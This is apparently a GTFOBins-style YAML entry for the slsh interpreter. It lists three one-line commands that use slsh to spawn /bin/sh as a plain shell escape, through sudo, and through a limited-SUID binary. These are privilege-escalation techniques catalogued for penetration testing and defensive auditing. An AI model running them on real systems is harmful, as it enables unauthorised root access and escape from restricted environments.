---
functions:
  shell:
    - code: slsh -e 'system("/bin/sh")'
  sudo:
    - code: sudo slsh -e 'system("/bin/sh")'
  limited-suid:
    - code: ./slsh -e 'system("/bin/sh")'
---
